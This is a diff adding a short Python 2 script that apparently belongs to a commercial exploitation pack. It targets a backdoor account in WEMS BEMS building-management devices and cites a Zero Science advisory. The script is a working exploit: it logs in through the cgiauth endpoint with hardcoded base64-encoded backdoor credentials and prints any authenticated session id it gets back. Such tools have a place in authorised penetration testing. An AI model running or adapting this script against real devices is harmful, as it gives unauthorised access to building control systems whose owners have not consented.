@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_wems_1'
+_vendor_ = 'wems'
+_model_  = ['BEMS']
+_vuln_   = 'Backdoor Account Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5552.php'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/cgi-bin/cgiauth?user=YWRhbWNvbGxlY3Q&pass=YzAxMTNjdGFkYW0K&cmd=auth" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if ("level=3" in response.text) and ("sessionid=" in response.text):
+    print '[+] %s vulnerable' % host
+    print response.text
+  else:
+    print '[+] %s not vulnerable' % host
+    print response.text
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
